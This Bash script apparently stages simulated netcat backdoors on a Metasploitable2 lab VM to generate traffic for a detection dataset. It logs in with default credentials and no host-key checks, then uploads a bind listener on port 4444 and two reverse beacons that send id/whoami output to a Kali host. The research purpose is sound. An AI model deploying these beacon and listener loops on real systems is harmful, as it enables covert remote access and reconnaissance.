#!/usr/bin/env bash
set -euo pipefail

# ============================================================
# setup_backdoor_nc_payloads.sh
#
# 作用：
#   预部署 nc/bash 后门行为脚本。
#   这一步不抓包、不进入训练数据。
#
# fixed3:
#   - bind loop 不再依赖目标机 timeout 命令
#   - reverse/reconnect 使用“写消息文件 + nc -w 3 < 文件”
#   - setup 阶段清理旧日志和旧远端脚本
# ============================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/config.sh"

TARGET_IP="${VICTIM_IP:-192.168.9.131}"
TARGET_USER="${TARGET_USER:-msfadmin}"
TARGET_PASS="${TARGET_PASS:-msfadmin}"

export SSHPASS="$TARGET_PASS"

SSH_OPTS=(
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o HostKeyAlgorithms=+ssh-rsa,ssh-dss
  -o ConnectTimeout=8
)

SCP_OPTS=(
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o HostKeyAlgorithms=+ssh-rsa,ssh-dss
)

TMP_DIR="/tmp/backdoor_nc_setup_fixed3"
mkdir -p "$TMP_DIR"

echo "[*] Target: ${TARGET_USER}@${TARGET_IP}"
echo "[*] Generating remote nc/bash helper scripts..."

cat > "$TMP_DIR/bd_bind_loop.sh" <<'REMOTE'
#!/usr/bin/env bash
set -euo pipefail

BIND_PORT="${1:-4444}"
DURATION="${2:-300}"
PROFILE="${3:-bind_steady_beacon}"
SEED="${4:-12345}"

RANDOM="$SEED"
END_TS=$((SECONDS + DURATION))
LOG_FILE="/tmp/bd_bind_loop_${BIND_PORT}.log"
FIFO="/tmp/bd_bind_fifo_${BIND_PORT}"
IN_LOG="/tmp/bd_bind_in_${BIND_PORT}.log"

rand_int() {
  local min="$1"
  local max="$2"
  echo $(( RANDOM % (max - min + 1) + min ))
}

case "$PROFILE" in
  bind_steady_beacon)
    KEEP_MIN=8
    KEEP_MAX=16
    ;;
  bind_interactive_c2)
    KEEP_MIN=3
    KEEP_MAX=8
    ;;
  *)
    KEEP_MIN=8
    KEEP_MAX=16
    ;;
esac

echo "[START] bd_bind_loop port=$BIND_PORT duration=$DURATION profile=$PROFILE seed=$SEED ts=$(date -u +%s)" >> "$LOG_FILE"

cleanup() {
  pkill -f "[n]c -l -p ${BIND_PORT}" >/dev/null 2>&1 || true
  rm -f "$FIFO" >/dev/null 2>&1 || true
}
trap cleanup EXIT

rm -f "$FIFO" "$IN_LOG" >/dev/null 2>&1 || true
mkfifo "$FIFO"

while (( SECONDS < END_TS )); do
  {
    echo "bd_bind_ready host=$(hostname) ts=$(date -u +%s)"
    loops=$(rand_int 1 2)
    for _ in $(seq 1 "$loops"); do
      echo "bd_keepalive host=$(hostname) uid=$(id -u) ts=$(date -u +%s)"
      sleep "$(rand_int "$KEEP_MIN" "$KEEP_MAX")"
      if (( SECONDS >= END_TS )); then
        break
      fi
    done
    echo "bd_bind_close ts=$(date -u +%s)"
  } > "$FIFO" &

  WRITER_PID=$!

  # Metasploitable2 没有 timeout 命令，所以使用后台 nc + sleep + kill。
  nc -l -p "$BIND_PORT" < "$FIFO" >> "$IN_LOG" 2>> "$LOG_FILE" &
  NC_PID=$!

  # 最多等待 25 秒；如果 Kali 已连接并正常结束，wait 会提前返回。
  WAIT_LEFT=25
  while (( WAIT_LEFT > 0 )); do
    if ! kill -0 "$NC_PID" >/dev/null 2>&1; then
      break
    fi
    sleep 1
    WAIT_LEFT=$((WAIT_LEFT - 1))
  done

  if kill -0 "$NC_PID" >/dev/null 2>&1; then
    kill "$NC_PID" >/dev/null 2>&1 || true
  fi

  wait "$NC_PID" 2>/dev/null || true
  wait "$WRITER_PID" 2>/dev/null || true

  echo "[INFO] bind served or timed out one connection ts=$(date -u +%s)" >> "$LOG_FILE"
  sleep "$(rand_int 1 4)"
done

echo "[END] bd_bind_loop ts=$(date -u +%s)" >> "$LOG_FILE"
REMOTE

cat > "$TMP_DIR/bd_reverse_loop.sh" <<'REMOTE'
#!/usr/bin/env bash
set -euo pipefail

KALI_IP="$1"
C2_PORT="$2"
DURATION="${3:-300}"
PROFILE="${4:-reverse_steady_beacon}"
SEED="${5:-12345}"

RANDOM="$SEED"
END_TS=$((SECONDS + DURATION))
LOG_FILE="/tmp/bd_reverse_loop_${C2_PORT}.log"
MSG_FILE="/tmp/bd_reverse_msg_${C2_PORT}.txt"

rand_int() {
  local min="$1"
  local max="$2"
  echo $(( RANDOM % (max - min + 1) + min ))
}

case "$PROFILE" in
  reverse_steady_beacon)
    SLEEP_MIN=10
    SLEEP_MAX=20
    MSGS_MIN=1
    MSGS_MAX=1
    ;;
  reverse_interactive_c2)
    SLEEP_MIN=5
    SLEEP_MAX=12
    MSGS_MIN=1
    MSGS_MAX=3
    ;;
  *)
    SLEEP_MIN=10
    SLEEP_MAX=20
    MSGS_MIN=1
    MSGS_MAX=1
    ;;
esac

CMDS=("id" "whoami" "hostname" "pwd" "uptime")

pick_cmd() {
  local idx
  idx=$(rand_int 0 $((${#CMDS[@]} - 1)))
  echo "${CMDS[$idx]}"
}

echo "[START] bd_reverse_loop kali=$KALI_IP port=$C2_PORT duration=$DURATION profile=$PROFILE seed=$SEED ts=$(date -u +%s)" >> "$LOG_FILE"

while (( SECONDS < END_TS )); do
  MSGS=$(rand_int "$MSGS_MIN" "$MSGS_MAX")

  {
    echo "bd_reverse_checkin host=$(hostname) ts=$(date -u +%s)"
    for _ in $(seq 1 "$MSGS"); do
      CMD="$(pick_cmd)"
      echo "cmd=$CMD"
      sh -c "$CMD" 2>/dev/null | head -n 3
    done
    echo "bd_reverse_close ts=$(date -u +%s)"
  } > "$MSG_FILE"

  if nc -w 3 "$KALI_IP" "$C2_PORT" < "$MSG_FILE" >> "$LOG_FILE" 2>&1; then
    echo "[INFO] sent reverse checkin ts=$(date -u +%s)" >> "$LOG_FILE"
  else
    echo "[WARN] failed reverse checkin ts=$(date -u +%s)" >> "$LOG_FILE"
  fi

  sleep "$(rand_int "$SLEEP_MIN" "$SLEEP_MAX")"
done

echo "[END] bd_reverse_loop ts=$(date -u +%s)" >> "$LOG_FILE"
REMOTE

cat > "$TMP_DIR/bd_reconnect_loop.sh" <<'REMOTE'
#!/usr/bin/env bash
set -euo pipefail

KALI_IP="$1"
C2_PORT="$2"
DURATION="${3:-300}"
PROFILE="${4:-reverse_reconnect_beacon}"
SEED="${5:-12345}"

RANDOM="$SEED"
END_TS=$((SECONDS + DURATION))
LOG_FILE="/tmp/bd_reconnect_loop_${C2_PORT}.log"
MSG_FILE="/tmp/bd_reconnect_msg_${C2_PORT}.txt"

rand_int() {
  local min="$1"
  local max="$2"
  echo $(( RANDOM % (max - min + 1) + min ))
}

case "$PROFILE" in
  reverse_reconnect_beacon)
    OFF_MIN=7
    OFF_MAX=14
    ;;
  *)
    OFF_MIN=7
    OFF_MAX=14
    ;;
esac

echo "[START] bd_reconnect_loop kali=$KALI_IP port=$C2_PORT duration=$DURATION profile=$PROFILE seed=$SEED ts=$(date -u +%s)" >> "$LOG_FILE"

while (( SECONDS < END_TS )); do
  {
    echo "bd_reconnect_beacon host=$(hostname) ts=$(date -u +%s)"
    echo "uid=$(id -u) user=$(whoami)"
    echo "bd_reconnect_close ts=$(date -u +%s)"
  } > "$MSG_FILE"

  if nc -w 3 "$KALI_IP" "$C2_PORT" < "$MSG_FILE" >> "$LOG_FILE" 2>&1; then
    echo "[INFO] sent reconnect beacon ts=$(date -u +%s)" >> "$LOG_FILE"
  else
    echo "[WARN] failed reconnect beacon ts=$(date -u +%s)" >> "$LOG_FILE"
  fi

  sleep "$(rand_int "$OFF_MIN" "$OFF_MAX")"
done

echo "[END] bd_reconnect_loop ts=$(date -u +%s)" >> "$LOG_FILE"
REMOTE

chmod +x "$TMP_DIR"/bd_*.sh

echo "[*] Cleaning old remote scripts/logs..."
sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "pkill -9 -f '[b]d_bind_loop.sh' || true; \
   pkill -9 -f '[b]d_reverse_loop.sh' || true; \
   pkill -9 -f '[b]d_reconnect_loop.sh' || true; \
   pkill -f '[n]c -l -p 4444' || true; \
   rm -f /tmp/bd_bind_loop.sh /tmp/bd_reverse_loop.sh /tmp/bd_reconnect_loop.sh; \
   rm -f /tmp/bd_bind_loop_*.log /tmp/bd_reverse_loop_*.log /tmp/bd_reconnect_loop_*.log; \
   rm -f /tmp/bd_*_msg_*.txt /tmp/bd_bind_fifo_* /tmp/bd_bind_in_*.log" \
  >/dev/null 2>&1 || true

echo "[*] Uploading remote scripts..."
sshpass -e scp "${SCP_OPTS[@]}" "$TMP_DIR/bd_bind_loop.sh" "$TARGET_USER@$TARGET_IP:/tmp/bd_bind_loop.sh"
sshpass -e scp "${SCP_OPTS[@]}" "$TMP_DIR/bd_reverse_loop.sh" "$TARGET_USER@$TARGET_IP:/tmp/bd_reverse_loop.sh"
sshpass -e scp "${SCP_OPTS[@]}" "$TMP_DIR/bd_reconnect_loop.sh" "$TARGET_USER@$TARGET_IP:/tmp/bd_reconnect_loop.sh"

echo "[*] Setting executable permissions..."
sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "chmod +x /tmp/bd_bind_loop.sh /tmp/bd_reverse_loop.sh /tmp/bd_reconnect_loop.sh && ls -l /tmp/bd_*_loop.sh"

echo "[+] Backdoor nc/bash fixed3 setup finished."
echo "[+] Do not use this setup traffic as training data."
